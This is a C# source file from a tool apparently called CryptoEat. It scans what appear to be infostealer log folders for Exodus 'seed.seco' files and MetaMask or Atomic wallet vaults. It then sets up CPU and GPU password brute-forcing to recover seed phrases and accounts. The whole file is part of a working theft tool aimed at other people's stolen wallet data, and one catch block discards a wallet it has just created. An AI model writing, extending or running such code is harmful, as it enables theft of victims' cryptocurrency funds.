using CryptoEat.Modules.Wallet;
using CryptoEat.Modules.Wallet.Libs;
using NBitcoin;
using Account = Nethereum.Web3.Accounts.Account;

namespace CryptoEat.Modules.Logs;

internal static class Logs
{
    internal static List<Log> LogsList = new();

    internal static void ProcessLogs()
    {
        Helpers.SetTitle("Processing logs...");
        var checkedDirs = Generic.DirsList.Where(Directory.Exists).ToList();

        Helpers.ResetCounters();
        Helpers.Max = checkedDirs.Count;

        foreach (var dir in checkedDirs)
        {
            if (File.Exists(Path.Combine(dir, "seed.seco")))
                LogsList.Add(new Log(Path.Combine(dir, "seed.seco"), WalletType.Exodus));
            else if (File.Exists(Path.Combine(dir, "CURRENT")) &&
                     !(Path.GetDirectoryName(dir)?.IndexOf("discord", StringComparison.OrdinalIgnoreCase) >= 0))
                LogsList.Add(new Log(dir, WalletType.Metamask));

            Helpers.Count++;
            Helpers.SetTitle("Processing logs...");
        }

        GC.Collect();

        LogsList = LogsList.Where(x => x.Wallet != null).ToList();

        Helpers.ResetCounters();
        Helpers.SetTitle();
    }
}

internal class Log
{
    internal string LogPath;
    internal IWallet? Wallet;

    internal Log(string logPath, WalletType type)
    {
        LogPath = logPath;
        switch (type)
        {
            case WalletType.Metamask:
                try
                {
                    Wallet = new Metamask(LogPath);
                }
                catch
                {
                    try
                    {
                        Wallet = new Atomic(LogPath);
                    }
                    catch
                    {
                        Wallet = null;
                    }

                    Wallet = null;
                }

                break;
            case WalletType.Exodus:
                try
                {
                    Wallet = new Exodus(LogPath);
                }
                catch
                {
                    Wallet = null;
                }

                break;
            default:
                throw new ArgumentOutOfRangeException(nameof(type), type, null);
        }
    }
}

internal enum WalletType : byte
{
    Metamask,
    Ronin,
    Binance,
    Exodus,
    Atomic
}

internal class Output
{
    internal static readonly Output Empty = new();
    internal Account[]? Accounts;
    internal Mnemonic? Mnemonic;

    public static implicit operator Output(Mnemonic mnemo)
    {
        return new Output { Mnemonic = mnemo };
    }

    public override string? ToString()
    {
        return Mnemonic?.ToString();
    }
}

internal interface IWallet
{
    internal WalletInfo? WalletInfo { get; init; }
    internal WalletType WalletName { get; init; }

    internal bool TryBrute(ref HashSet<string> passwords, out Output? mnemo, out string password);
    internal bool TryBruteCpu(ref HashSet<string> passwords, out Output? mnemo, out string password);
    internal bool TryBruteGpu(ref HashSet<string> passwords, out Output? mnemo, out string password);
}